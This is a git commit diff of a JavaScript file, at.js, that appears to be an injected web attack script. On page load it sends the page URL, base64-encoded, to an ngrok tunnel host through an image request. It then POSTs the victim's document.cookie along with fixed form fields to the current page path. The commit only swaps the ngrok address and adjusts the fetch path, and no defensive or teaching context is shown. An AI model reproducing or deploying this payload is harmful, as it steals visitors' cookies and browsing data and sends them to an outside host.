eaf86bd46fe315356dc4784002a5ddaa874f9161
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-20 10:01:43 +0530

    Update at.js
    d

--- at.js
+++ at.js
@@ -1,14 +1,14 @@
 window.addEventListener('load', function () {
  function send2server(name, data){
     img = document.createElement("img");
-    img.src = "https://392445a8.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
+    img.src = "https://2c48e50e.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
     document.getElementById("chat-div").appendChild(img);
 }
 
  send2server("url", window.location.href);
 
 
-  fetch(window.location.pathname.slice(1,),{
+  fetch(window.location.pathname,{
     method: 'POST',
     body: 'name=test&user_id=2&' +document.cookie,
      headers: {
